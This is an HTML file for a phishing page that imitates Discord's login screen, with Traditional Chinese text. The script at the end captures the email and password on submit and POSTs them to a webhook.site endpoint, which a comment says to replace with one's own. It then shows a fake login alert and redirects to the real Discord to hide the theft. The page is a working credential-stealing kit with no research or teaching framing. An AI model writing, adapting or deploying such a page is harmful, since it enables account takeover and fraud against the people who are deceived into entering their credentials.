<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <title>Discord - 登入</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      color: #dcddde;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      display: flex;
      width: 100%;
      max-width: 1000px;
      height: 100%;
      background: #36393f;
    }
    .left {
      flex: 1;
      padding: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      max-width: 480px;
    }
    .right {
      flex: 1;
      background: #2f3136;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #b9bbbe;
      font-size: 14px;
    }
    .logo {
      margin-bottom: 30px;
      text-align: center;
    }
    .logo img {
      width: 80px;
    }
    h1 {
      font-size: 24px;
      color: #fff;
      margin: 0 0 8px;
      text-align: center;
    }
    .sub {
      text-align: center;
      color: #b9bbbe;
      margin-bottom: 30px;
      font-size: 16px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: #b9bbbe;
      font-size: 14px;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 20px;
      background: #202225;
      border: 1px solid #202225;
      border-radius: 3px;
      color: #fff;
      font-size: 16px;
      box-sizing: border-box;
    }
    input:focus {
      outline: none;
      border-color: #5865f2;
      box-shadow: 0 0 0 2px rgba(88,101,242,.3);
    }
    button {
      width: 100%;
      padding: 12px;
      background: #5865f2;
      color: #fff;
      border: none;
      border-radius: 3px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background .2s;
    }
    button:hover {
      background: #4752c4;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #72767d;
    }
    .footer a {
      color: #00aff4;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <div class="logo">
        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
      </div>
      <h1>歡迎回來！</h1>
      <div class="sub">我們很高興又見到您了！</div>
      
      <form id="login-form">
        <label>電子郵件或電話號碼 *</label>
        <input type="text" id="email" required>
        
        <label>密碼 *</label>
        <input type="password" id="password" required>
        
        <button type="submit">登入</button>
      </form>
      
      <div class="footer">
        <a href="#">忘記密碼？</a><br>
        需要一個帳號？ <a href="#">註冊</a>
      </div>
    </div>
    
    <div class="right">
      <!-- QR Code 區塊已完全刪除 -->
      <!-- 原右側內容已移除，只留藍色漸層背景 -->
    </div>
  </div>

  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      // 傳送到你的 webhook（改成你自己的）
      fetch('https://webhook.site/7a08f4e8-a861-4eb9-9104-5412abf52d94', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
          email: email,
          password: password,
          timestamp: Date.now(),
          ua: navigator.userAgent,
          url: location.href
        })
      });
      
      // 假登入效果 + 跳轉真 Discord
      alert('登入中...');
      setTimeout(() => { location.href = 'https://discord.com/login'; }, 1000);
    });
  </script>
</body>
</html>
